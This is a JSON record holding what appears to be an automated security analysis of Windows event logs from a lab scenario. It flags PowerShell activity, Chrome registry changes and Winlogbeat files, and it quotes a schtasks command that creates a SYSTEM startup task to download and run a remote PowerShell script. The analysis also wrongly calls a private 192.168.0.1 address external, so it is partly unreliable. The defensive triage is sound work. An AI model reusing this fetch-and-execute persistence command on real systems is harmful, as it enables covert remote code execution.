{"file":"events\/scenario5\/20250411_181227.jsonl","analysis":"Based on the provided log data, here's a summary of notable events and potential security concerns:\n\n1. **Suspicious PowerShell Activity:**\n   - A PowerShell process created a startup profile data file: `C:\\Users\\fiddelis\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive`\n   - Multiple files were created by PowerShell processes:\n     - `C:\\Users\\fiddelis\\Downloads\\entrada_principal.txt`\n     - `C:\\Users\\fiddelis\\Downloads\\objeto_auxiliar.txt`\n   - A PowerShell process executed a command to create a scheduled task named \"unidade\\_comum\":\n\n     ```\n     schtasks \/create \/tn \"unidade_comum\" \/tr \"powershell.exe -Command 'iex ((new-object net.webclient).DownloadString('http:\/\/192.168.0.1:80\/script.ps1'))'\" \/sc onstart \/ru SYSTEM\n     ```\n\n   - **Potential security concern:** The PowerShell script downloaded from `http:\/\/192.168.0.1:80\/script.ps1` could be malicious, as it's an unknown external source.\n\n2. **Scheduled Task Created:**\n   - A scheduled task named \"unidade\\_comum\" was created with the trigger set to run on system startup (`\/sc onstart`) and running under the SYSTEM account (`\/ru SYSTEM`).\n\n3. **Chrome Registry Modifications:**\n   - Multiple Chrome processes made registry value changes. This could indicate unwanted behavior or malware.\n\n4. **Dns Query by Chrome:**\n   - A Chrome process performed a DNS query, which might suggest communication with an external server. However, without additional context, it's challenging to determine if this is normal or malicious activity.\n\n5. **Winlogbeat Activity:**\n   - Winlogbeat processes created or modified configuration files:\n     - `C:\\Users\\fiddelis\\Downloads\\winlogbeat-8.15.1-windows-x86_64\\data\\.winlogbeat.yml.new`\n   - **Potential security concern:** Ensure that winlogbeat is configured correctly and isn't inadvertently sending sensitive data.\n\nTo further investigate these activities, you may want to:\n\n- Review the created files (`entrada_principal.txt`, `objeto_auxiliar.txt`) and scheduled task (\"unidade\\_comum\") for suspicious content.\n- Check if the PowerShell script download source (http:\/\/192.168.0.1:80\/script.ps1) is legitimate or malicious.\n- Inspect Chrome's behavior to ensure it hasn't been compromised.\n- Verify winlogbeat configuration and logs to ensure they don't contain sensitive data."}
